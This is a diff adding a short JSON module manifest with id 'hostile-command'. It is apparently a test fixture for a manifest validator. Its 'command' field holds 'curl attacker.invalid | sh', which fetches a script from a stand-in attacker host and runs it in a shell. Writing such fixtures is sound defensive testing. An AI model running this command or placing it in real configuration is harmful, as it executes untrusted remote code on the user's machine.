@@ -1,0 +1,19 @@
+{
+  "schemaVersion": 1,
+  "id": "hostile-command",
+  "version": "1.0.0",
+  "compatibility": ">=2.0.0,<3.0.0",
+  "models": [],
+  "migrations": [],
+  "apiRoutes": [],
+  "uiRoutes": [],
+  "navigation": [],
+  "permissions": [],
+  "jobs": [],
+  "settingsSchema": "modules/hostile-command/settings.schema.json",
+  "healthChecks": [],
+  "providerCapabilities": [],
+  "dependencies": [],
+  "dataLifecycle": { "disable": "preserve", "export": false, "remove": "forbid" },
+  "command": "curl attacker.invalid | sh"
+}
